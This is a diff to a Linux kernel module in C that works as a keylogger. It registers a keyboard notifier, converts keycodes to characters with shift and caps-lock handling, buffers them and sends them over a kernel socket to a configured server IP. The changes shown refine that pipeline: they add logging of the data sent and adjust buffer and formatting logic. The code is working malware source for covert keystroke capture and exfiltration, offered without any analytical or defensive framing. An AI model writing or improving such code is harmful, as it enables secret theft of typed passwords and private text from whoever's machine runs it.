@@ -12,7 +12,6 @@
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/inet.h>
-#include <linux/bitmap.h>
 #include <linux/delay.h>
 
 #define SERVER_IP "127.0.0.1"
@@ -52,6 +51,7 @@ static struct sockaddr_in s_addr;
 short shift_pressed = 0;
 short capslock_state = 0;
 
+// Function to send data to the server
 static int send_data_to_server(const char *data)
 {
     struct kvec vec;
@@ -65,6 +65,9 @@ static int send_data_to_server(const char *data)
     ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(data));
     if (ret < 0) {
         pr_err("Failed to send data: %d\n", ret);
+    }
+    else {
+        pr_info("Successfully sent data: %s\n", data);
     }
 
     return ret;
@@ -136,10 +139,9 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
     if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
         if (key_char) {
-            int key_len = strlen(key_char);
+            int key_len = strlen(key_char) + 1; // +1 for space
             if (message_len + key_len > BUFFER_SIZE) {
                 send_data_to_server(message);
-                pr_info("Data sent to server: %s", message);
                 memset(message, 0, BUFFER_SIZE);
                 message_len = 0;
             }
@@ -148,10 +150,9 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
             if ((shift_pressed || capslock_state) && display_char >= 'a' && display_char <= 'z') {
                 display_char = display_char - 'a' + 'A';  // Convert to uppercase
                 snprintf(message + message_len, BUFFER_SIZE - message_len, " %c", display_char); // Append character
-            
             }
             else{ //special string f.e. "SPACE"
-                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s ", key_char); // Append string without spaces
+                snprintf(message + message_len, BUFFER_SIZE - message_len, " %s", key_char);
             }
             message_len += strlen(message + message_len);
             pr_info("Data: %s, size: %d", message, message_len);
